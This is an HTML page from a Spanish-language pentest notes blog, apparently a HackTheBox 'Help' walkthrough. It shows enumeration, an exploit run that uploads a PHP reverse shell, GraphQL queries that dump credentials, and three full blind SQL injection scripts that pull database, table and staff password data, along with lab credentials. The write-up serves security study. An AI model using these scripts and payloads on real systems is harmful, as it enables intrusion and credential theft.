@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://help.htb &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 150&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://help.htb <span class="nt">-w</span> /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <span class="nt">-t</span> 150
+</code></pre></div></div>
+
+<p>http://help.htb/support/readme.html</p>
+
+<p>Version: 1.0.2 from 1st June 2015</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit HelpDeskZ
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/.pyenv/versions/2.7.18/bin/python 40300.py  http://help.htb/support/uploads/tickets/ rev_shell.php
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvnp 4444
+</code></pre></div></div>
+
+<h1 id="graphql">GraphQL</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/dolevf/graphw00f.git
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 main.py <span class="nt">-f</span> <span class="nt">-t</span> http://10.10.10.121:3000/graphql
+</code></pre></div></div>
+
+<p>Instrospection query</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"query"</span><span class="p">:</span><span class="w"> </span><span class="s2">"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/graphql</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.10.121</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate, br</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US;q=0.9,en;q=0.8</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">82</span>
+
+<span class="p">{</span><span class="nl">"query"</span><span class="p">:</span><span class="s2">"query user {</span><span class="se">\n</span><span class="s2">    user {</span><span class="se">\n</span><span class="s2">        password</span><span class="se">\n</span><span class="s2">        username</span><span class="se">\n</span><span class="s2">    }</span><span class="se">\n</span><span class="s2">}"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>helpme@helpme.com \ godhelpmeplz
+</code></pre></div></div>
+
+<p>Extraer nombre de la base de datos</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="n">requests</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">signal</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">pdb</span><span class="p">,</span> <span class="n">urllib3</span>
+<span class="kn">from</span> <span class="n">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>
+
+<span class="k">def</span> <span class="nf">sig_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n\n</span><span class="s">[!] Saliendo...</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">signal</span><span class="p">.</span><span class="nf">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">sig_handler</span><span class="p">)</span>
+
+<span class="c1">#Variables Globales
+</span><span class="n">characters</span><span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="sh">'</span><span class="s">_</span><span class="sh">'</span>
+<span class="n">Cookie</span><span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">usrhash</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BE3IrjgqzGu%2BU2KAyaJPiVy97oC5vrSOyyszlYc1LNlNw%3D%3D</span><span class="sh">"</span><span class="p">}</span>
+<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">http</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span><span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">makeSQLI</span><span class="p">():</span>
+        <span class="n">s</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="nf">session</span><span class="p">()</span>
+        <span class="n">s</span><span class="p">.</span><span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span>
+
+        <span class="n">p1</span><span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="sh">"</span><span class="s">Fuerza Bruta</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">p1</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="sh">"</span><span class="s">Iniciando proceso de fuerza bruta</span><span class="sh">"</span><span class="p">)</span>
+
+        <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+        <span class="n">p2</span><span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="sh">"</span><span class="s">Database</span><span class="sh">"</span><span class="p">)</span>
+
+        <span class="n">database</span><span class="o">=</span> <span class="sh">""</span>
+        
+        <span class="k">for</span> <span class="n">position</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">8</span><span class="p">):</span> <span class="c1">#Rango 1 - (tamaño database + 1)
+</span>                <span class="k">for</span> <span class="n">character</span> <span class="ow">in</span> <span class="n">characters</span><span class="p">:</span>
+                        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s"> AND ((substr((select database()),</span><span class="si">{</span><span class="n">position</span><span class="si">}</span><span class="s">,1))=</span><span class="sh">'</span><span class="si">{</span><span class="n">character</span><span class="si">}</span><span class="sh">'</span><span class="s">) -- -</span><span class="sh">"</span>
+                        <span class="n">p1</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+                        <span class="n">url</span><span class="o">=</span> <span class="sh">"</span><span class="s">http://help.htb/support/?v=view_tickets&amp;action=ticket&amp;param[]=4&amp;param[]=attachment&amp;param[]=1&amp;param[]=6</span><span class="sh">"</span> <span class="o">+</span> <span class="n">payload</span>
+                        <span class="n">url</span> <span class="o">=</span> <span class="nf">quote</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">safe</span><span class="o">=</span><span class="sh">'</span><span class="s">:/?&amp;=.,</span><span class="sh">'</span><span class="p">)</span>
+                        <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">Cookie</span><span class="p">,</span><span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+                        <span class="k">if</span> <span class="ow">not</span> <span class="sh">"</span><span class="s">helpdesk</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+                                <span class="n">database</span> <span class="o">+=</span> <span class="n">character</span>
+                                <span class="n">p2</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="n">database</span><span class="p">)</span>
+                                <span class="k">break</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
+        <span class="nf">makeSQLI</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Extraer nombres de las tablas</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="n">requests</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">signal</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">pdb</span><span class="p">,</span> <span class="n">urllib3</span>
+<span class="kn">from</span> <span class="n">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>
+
+<span class="k">def</span> <span class="nf">sig_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n\n</span><span class="s">[!] Saliendo...</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">signal</span><span class="p">.</span><span class="nf">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">sig_handler</span><span class="p">)</span>
+
+<span class="c1">#Variables Globales
+</span><span class="n">characters</span><span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="sh">'</span><span class="s">_</span><span class="sh">'</span>
+<span class="n">Cookie</span><span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">usrhash</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BE3IrjgqzGu%2BU2KAyaJPiVy97oC5vrSOyyszlYc1LNlNw%3D%3D</span><span class="sh">"</span><span class="p">}</span>
+<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">http</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span><span class="p">}</span>
+
+
+<span class="k">def</span> <span class="nf">makeSQLI</span><span class="p">():</span>
+	<span class="n">s</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="nf">session</span><span class="p">()</span>
+	<span class="n">s</span><span class="p">.</span><span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span>
+
+	<span class="n">p1</span><span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="sh">"</span><span class="s">Fuerza Bruta</span><span class="sh">"</span><span class="p">)</span>
+	<span class="n">p1</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="sh">"</span><span class="s">Iniciando proceso de fuerza bruta</span><span class="sh">"</span><span class="p">)</span>
+
+	<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+	<span class="n">numChars</span> <span class="o">=</span> <span class="mi">0</span>
+
+	<span class="n">p2</span><span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="sh">"</span><span class="s">Tables</span><span class="sh">"</span><span class="p">)</span>
+
+	<span class="n">table_name</span><span class="o">=</span> <span class="sh">""</span>
+	<span class="k">for</span> <span class="n">table</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">):</span>
+		<span class="k">for</span> <span class="n">position</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">15</span><span class="p">):</span> <span class="c1">#Rango 1 - (tamaño database + 1)
+</span>			<span class="k">for</span> <span class="n">character</span> <span class="ow">in</span> <span class="n">characters</span><span class="p">:</span>
+				<span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s"> AND (substr((select table_name from information_schema.tables where table_schema=database() limit </span><span class="si">{</span><span class="n">table</span><span class="si">}</span><span class="s">,1) ,</span><span class="si">{</span><span class="n">position</span><span class="si">}</span><span class="s">,1)=</span><span class="sh">'</span><span class="si">{</span><span class="n">character</span><span class="si">}</span><span class="sh">'</span><span class="s">) -- -</span><span class="sh">"</span>
+				<span class="n">p1</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+				<span class="n">url</span><span class="o">=</span> <span class="sh">"</span><span class="s">http://help.htb/support/?v=view_tickets&amp;action=ticket&amp;param[]=4&amp;param[]=attachment&amp;param[]=1&amp;param[]=6</span><span class="sh">"</span> <span class="o">+</span> <span class="n">payload</span>
+				<span class="n">url</span> <span class="o">=</span> <span class="nf">quote</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">safe</span><span class="o">=</span><span class="sh">'</span><span class="s">:/?&amp;=.,</span><span class="sh">'</span><span class="p">)</span>
+				<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">Cookie</span><span class="p">,</span><span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+				<span class="k">if</span> <span class="ow">not</span> <span class="sh">"</span><span class="s">helpdesk</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+					<span class="n">table_name</span> <span class="o">+=</span> <span class="n">character</span>
+					<span class="n">p2</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="n">table_name</span><span class="p">)</span>
+					<span class="k">break</span>
+				<span class="k">else</span><span class="p">:</span>
+					<span class="n">numChars</span><span class="o">+=</span> <span class="mi">1</span>
+			<span class="k">if</span> <span class="n">numChars</span> <span class="o">==</span> <span class="nf">len</span><span class="p">(</span><span class="n">characters</span><span class="p">):</span>
+				<span class="k">break</span>
+		<span class="n">table_name</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">, </span><span class="sh">"</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
+	<span class="nf">makeSQLI</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<p>Extraer contenido</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="n">requests</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">signal</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">pdb</span><span class="p">,</span> <span class="n">urllib3</span>
+<span class="kn">from</span> <span class="n">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>
+
+<span class="k">def</span> <span class="nf">sig_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n\n</span><span class="s">[!] Saliendo...</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">signal</span><span class="p">.</span><span class="nf">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">sig_handler</span><span class="p">)</span>
+
+<span class="c1">#Variables Globales
+</span><span class="n">characters</span><span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="sh">'</span><span class="s">_</span><span class="sh">'</span> <span class="o">+</span> <span class="sh">'</span><span class="s">:</span><span class="sh">'</span>
+<span class="n">Cookie</span><span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">usrhash</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BE3IrjgqzGu%2BU2KAyaJPiVy97oC5vrSOyyszlYc1LNlNw%3D%3D</span><span class="sh">"</span><span class="p">}</span>
+<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">http</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span><span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">makeSQLI</span><span class="p">():</span>
+	<span class="n">s</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="nf">session</span><span class="p">()</span>
+	<span class="n">s</span><span class="p">.</span><span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span>
+
+	<span class="n">p1</span><span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="sh">"</span><span class="s">Fuerza Bruta</span><span class="sh">"</span><span class="p">)</span>
+	<span class="n">p1</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="sh">"</span><span class="s">Iniciando proceso de fuerza bruta</span><span class="sh">"</span><span class="p">)</span>
+
+	<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+	<span class="n">p2</span><span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="sh">"</span><span class="s">Data</span><span class="sh">"</span><span class="p">)</span>
+
+	<span class="n">data</span><span class="o">=</span> <span class="sh">""</span>
+	<span class="k">for</span> <span class="n">position</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">50</span><span class="p">):</span> <span class="c1">#Rango 1 - (tamaño database + 1)
+</span>		<span class="k">for</span> <span class="n">character</span> <span class="ow">in</span> <span class="n">characters</span><span class="p">:</span>
+			<span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s"> AND (substr((select group_concat(username,0x3A,password) from staff) ,</span><span class="si">{</span><span class="n">position</span><span class="si">}</span><span class="s">,1)=</span><span class="sh">'</span><span class="si">{</span><span class="n">character</span><span class="si">}</span><span class="sh">'</span><span class="s">) -- -</span><span class="sh">"</span>
+			<span class="n">p1</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+			<span class="n">url</span><span class="o">=</span> <span class="sh">"</span><span class="s">http://help.htb/support/?v=view_tickets&amp;action=ticket&amp;param[]=4&amp;param[]=attachment&amp;param[]=1&amp;param[]=6</span><span class="sh">"</span> <span class="o">+</span> <span class="n">payload</span>
+			<span class="n">url</span> <span class="o">=</span> <span class="nf">quote</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">safe</span><span class="o">=</span><span class="sh">'</span><span class="s">:/?&amp;=.,</span><span class="sh">'</span><span class="p">)</span>
+			<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">Cookie</span><span class="p">,</span><span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+			<span class="k">if</span> <span class="ow">not</span> <span class="sh">"</span><span class="s">helpdesk</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+				<span class="n">data</span> <span class="o">+=</span> <span class="n">character</span>
+				<span class="n">p2</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+				<span class="k">break</span>
+	<span class="n">data</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">, </span><span class="sh">"</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
+	<span class="nf">makeSQLI</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin \ Welcome1
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uname -a 
+</code></pre></div></div>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
